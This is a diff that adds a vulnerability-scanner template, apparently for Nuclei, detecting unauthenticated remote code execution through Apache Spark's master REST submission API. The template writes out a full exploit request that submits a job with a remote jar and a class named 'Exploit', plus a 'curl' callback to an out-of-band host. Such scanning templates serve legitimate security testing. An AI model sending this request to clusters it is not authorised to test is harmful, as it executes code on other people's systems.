@@ -1,0 +1,52 @@
+id: apache-spark-master-unauthorized-rce
+info:
+  name: Apache Spark Master REST Port Unauthorized Access RCE
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Apache Spark allows users to submit applications to master nodes for execution. If Access Control Lists (ACLs) are not enabled, it is possible to execute arbitrary code on the cluster.
+  reference:
+    - https://github.com/vulhub/vulhub/tree/master/spark/unacc
+  tags: unauthorized, rce
+
+variables:
+  random_hex: '{{rand_base(4)}}'
+  jar_file_url: 'http://example.com/ps/spark-warehouse'  # Replace with actual URL if known
+
+http:
+  - raw:
+      - |
+        POST /v1/submissions/create HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {
+          "action": "CreateSubmissionRequest",
+          "clientSparkVersion": "2.1.1",
+          "appArgs": [
+            "curl http://{{interactsh-url}}"
+          ],
+          "appResource": "{{jar_file_url}}",
+          "environmentVariables": {
+            "SPARK_ENV_LOADED": "1"
+          },
+          "mainClass": "Exploit",
+          "sparkProperties": {
+            "spark.jars": "{{jar_file_url}}",
+            "spark.driver.supervise": "false",
+            "spark.app.name": "sparkspark",
+            "spark.eventLog.enabled": "true",
+            "spark.submit.deployMode": "cluster",
+            "spark.master": "spark://{{Hostname}}"
+          }
+        }
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"success":true'
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
